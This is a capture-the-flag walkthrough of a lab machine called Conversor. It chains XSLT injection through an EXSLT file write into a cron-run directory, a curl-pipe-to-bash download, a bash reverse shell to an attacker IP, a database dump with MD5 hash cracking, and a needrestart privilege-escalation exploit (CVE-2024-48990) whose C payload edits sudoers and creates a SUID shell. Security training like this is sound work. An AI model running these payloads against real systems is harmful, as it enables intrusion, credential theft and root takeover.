# Conversor - Easy

```sh
sudo vim /etc/hosts
# map IP to conversor.htb

nmap -T4 -p- -A -Pn -v conversor.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
    * 80/tcp - http - Apache httpd 2.4.52

* checking the webpage, it leads to a '/login' page, where we have a login form and a register option

* web scan:

    ```sh
    gobuster dir -u http://conversor.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html -t 10
    # simple dir scan

    ffuf -c -u "http://conversor.htb" -H "Host: FUZZ.conversor.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fw 20 -s
    # subdomain scan
    ```

* from ```gobuster```, we get a few pages - /about and /javascript seem to be of interest

* in the /about page, we get the list of developers -

    * FisMatHack
    * Arturo Vidal
    * David Ramos

* the footer of this page gives us an email 'contact@conversor.htb', and an option to download the website source code too

* check the source code:

    ```sh
    tar -xvf source_code.tar.gz
    # this extracts all files

    ls -la
    # check all files

    cat app.py
    ```

* from the webapp Python code, we get the app secret key 'Changemeplease'

* we can also see the webapp has an upload folder 'uploads', concatenated to the base directory

* the password stored in the webapp DB is MD5-hashed; the code also includes functions on other utilities in the webapp - we can check this later

* checking the other files in the source code:

    ```sh
    cat install.md
    ```

* the install docs mention that the webapp is running using Flask; it also gives a cronjob which is running all Python scripts in ```/var/www/conversor.htb/scripts/``` every minute

* we can also check the 'users.db' file in the webapp code:

    ```sh
    cd instance
    
    sqlitebrowser users.db
    # the DB is not having any data
    ```

* now, once we register and log into the website, we can see that it provides an option to upload a XML file & a XSLT sheet for ```nmap``` scans, and it converts it into a prettified format

* the webapp also includes a sample XSLT file that we can use

* Googling about this shows that XSLT files are used to transform XML documents into other formats; so it generates new data based on existing XML data

* checking the webapp code again, we can check the 'convert' function it is using to do this:

    ```py
    def convert():
        if 'user_id' not in session:
            return redirect(url_for('login'))
        xml_file = request.files['xml_file']
        xslt_file = request.files['xslt_file']
        from lxml import etree
        xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
        xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
        xml_file.save(xml_path)
        xslt_file.save(xslt_path)
        try:
            parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
            xml_tree = etree.parse(xml_path, parser)
            xslt_tree = etree.parse(xslt_path)
            transform = etree.XSLT(xslt_tree)
            result_tree = transform(xml_tree)
            result_html = str(result_tree)
            file_id = str(uuid.uuid4())
            filename = f"{file_id}.html"
            html_path = os.path.join(UPLOAD_FOLDER, filename)
            with open(html_path, "w") as f:
                f.write(result_html)
            conn = get_db()
            conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
            conn.commit()
            conn.close()
            return redirect(url_for('index'))
        except Exception as e:
            return f"Error: {e}"
    ```

    * the XML and XSLT files are saved directly using the same filename
    * the code uses XML parsing, so external entities and network access is disabled
    * it applies the XSLT transformation and saves the HTML output to a new file
    * it also logs the generated file in a database

* we can upload a test XML file from a ```nmap``` scan output, and the given XSLT file to check for the valid output scenario

* after clicking on 'convert', we see a HTML link under uploaded files - clicking on it leads to the '/view/<random-filename.html>' endpoint, where the prettified format is shown

* as XML parsing is done, we cannot do XXE or any type of XML injection

* however, we can check for [XSLT injection attacks](https://ine.com/blog/xslt-injections-for-dummies)

* for the XSLT injection, we can upload a valid XML file and modify the given XSLT file before uploading

* for recon, we need to get some basic info on the processors:

    * original XSLT -

        ```xml
        <snip>
            <tr>
            <td><xsl:value-of select="@portid"/></td>
            <td><xsl:value-of select="@protocol"/></td>
            <td><xsl:value-of select="service/@name"/></td>
        <snip>
        ```

    * modified XSLT - 

        ```xml
        <snip>
            <td><xsl:value-of select="system-property('xsl:version')"/></td>
            <td><xsl:value-of select="system-property('xsl:vendor')"/></td>
            <td><xsl:value-of select="system-property('xsl:vendor-url')"/></td>
        <snip>
        ```
    
    * when we upload the file with the modified XSLT, the conversion works, and we get the following info from the converted HTML file -

        * XSL version - 1.0
        * XSL vendor - ```libxslt```
        * XSL vendor URL - 'http://xmlsoft.org/XSLT/'

* checking for exploits like local file read or XXE, we can test the [commonly used payloads](https://bughra.dev/posts/xslt/), but the conversion fails with errors like "cannot resolve URI", "entity not defined" or "XPath evaluation returned no result"

* we can attempt to [write to files using EXSLT extension](https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/#write-files-with-exslt-extension):

    * XML file -

        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <root>
        <item>Value</item>
        </root>
        ```
    
    * XSLT file -

        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <xsl:stylesheet
        xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
        xmlns:exploit="http://exslt.org/common" 
        extension-element-prefixes="exploit"
        version="1.0">
        <xsl:template match="/">
            <exploit:document href="/tmp/evil.txt" method="text">
            Hello World!
            </exploit:document>
        </xsl:template>
        </xsl:stylesheet>
        ```

* this works (the path needs to be mentioned in the 'href' attribute), when uploaded with the benign XML file, and the conversion goes through; the HTML file is empty but that is expected

* as we are now aware that Python scripts in the ```/var/www/conversor.htb/scripts``` are executed every minute, we can attempt to write a reverse shell Python script to that location:

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <xsl:stylesheet
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exploit="http://exslt.org/common" 
    extension-element-prefixes="exploit"
    version="1.0">
    <xsl:template match="/">
        <exploit:document href="/var/www/conversor.htb/scripts/test10.py" method="text">
    import os;
    os.system('curl http://10.10.14.34:8000/revshell.sh|bash')
        </exploit:document>
    </xsl:template>
    </xsl:stylesheet>
    ```

    ```sh
    nc -nvlp 4444
    # setup listener

    python3 -m http.server
    # host bash revshell script
    ```

    ```sh
    #!/bin/bash
    bash -i >& /dev/tcp/10.10.14.34/4444 0>&1
    ```

* once this XSLT file is uploaded with the normal XML file, the conversion works, and we get the reverse shell

* in this case, I had to test with multiple Python reverse shell one-liners and formats, but that did not work so I went ahead with fetching a reverse shell Bash script and executing that; before that, as a sanity check I tested with ```ping -c 1 10.10.14.34``` to check if it is able to ping my IP, and it worked

* now, in reverse shell:

    ```sh
    id
    # www-data

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # press Enter twice

    pwd
    # /var/www

    ls -la
    # web folder for conversor webpage

    cd conversor.htb

    ls -la
    # check all files

    cat app.py
    # gives cleartext secret key

    ls -la instance
    # we have users.db

    strings instance/users.db
    # this DB is not empty and contains data
    ```

* from the files in the webroot, we get the app secret key 'C0nv3rs0rIsthek3y29'

* we also find 'users.db' with data - we can transfer this to attacker machine:

    ```sh
    cd instance

    md5sum users.db
    # check hash

    cat users.db | base64 -w 0; echo
    # encode file to base64
    ```

    ```sh
    # in attacker
    echo -n "<base64-encoded-text>" | base64 -d > users.db

    md5sum users.db
    # verify hash

    sqlitebrowser users.db
    ```

* from the 'users.db' file, the 'users' table gives the password hash for user 'fismathack'

* as it is a MD5 hash, we can use [crackstation](https://crackstation.net) to crack it, and we get cleartext password 'Keepmesafeandwarm'

* checking in the target machine using ```ls -la /home```, we can see a user 'fismathack', so we can attempt to login via SSH now:

    ```sh
    ssh fismathack@conversor.htb
    # this works

    cat user.txt
    # user flag

    sudo -l
    ```

* ```sudo -l``` shows that we can run ```/usr/sbin/needrestart``` as sudo

* Googling about this binary shows that ```needrestart``` is a Linux tool used to [check for services that need to be restarted after library or kernel updates](https://manpages.ubuntu.com/manpages/focal/man1/needrestart.1.html)

* checking for current version of ```needrestart```:

    ```sh
    /usr/sbin/needrestart --help

    /usr/sbin/needrestart --version
    ```

* ```needrestart``` is on version 3.7

* Googling for exploits related to this version gives us [CVE-2024-48990](https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing/tree/main) - a privesc exploit for ```needrestart```

* we can follow the given PoC and try to get root shell:

    ```sh
    # on target
    which gcc
    # we do not have gcc compiler so we need to compile the C code on attacker
    ```

    ```sh
    # on attacker
    vim lib.c
    # code borrowed from exploit script
    # this will create a copy of shell binary, assign it SUID bit
    # and also update 'sudoers' to allow running copied shell as root

    gcc -shared -fPIC -o __init__.so lib.c
    # compile to shared library
    ```

    ```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <sys/types.h>
    #include <unistd.h>

    static void a() __attribute__((constructor));

    void a() {
        if(geteuid() == 0) {  // Only execute if we're running with root privileges
            setuid(0);
            setgid(0);
            const char *shell = "cp /bin/sh /tmp/poc; "
                                "chmod u+s /tmp/poc; "
                                "grep -qxF 'ALL ALL=NOPASSWD: /tmp/poc' /etc/sudoers || "
                                "echo 'ALL ALL=NOPASSWD: /tmp/poc' | tee -a /etc/sudoers > /dev/null &";
            system(shell);
        }
    }
    ```

    ```sh
    vim runner.sh
    # use rest of exploit
    # this fetches the malicious library, writes the Python script
    # and creates the PYTHONPATH var

    # I added the sudo needrestart command but that is not needed
    ```

    ```sh
    #!/bin/bash
    set -e
    cd /tmp
    mkdir -p malicious/importlib

    wget http://10.10.14.34:8000/__init__.so
    mv __init__.so /tmp/malicious/importlib/

    cat << 'EOF' > /tmp/malicious/e.py
    import time
    while True:
        try:
            import importlib
        except:
            pass
        if __import__("os").path.exists("/tmp/poc"):
            print("Got shell!, delete traces in /tmp/poc, /tmp/malicious")
            __import__("os").system("sudo /tmp/poc -p")
            break
        time.sleep(1)
    EOF

    cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2>/dev/null
    sudo /usr/sbin/needrestart
    ```

* once the exploit files are ready on attacker, we can transfer it to target:

    ```sh
    # on attacker, host the files
    python3 -m http.server
    ```

    ```sh
    # on target
    wget http://10.10.14.34:8000/runner.sh
    # fetch exploit script

    chmod +x runner.sh

    ./runner.sh
    # once this runs, it waits for root user to execute needrestart
    ```

    ```sh
    # log into a new SSH session to target from attacker
    ssh fismathack@conversor.htb

    sudo /usr/sbin/needrestart
    # once this runs, we get root shell on our previous session where the exploit is running
    # we can get root flag now
    ```
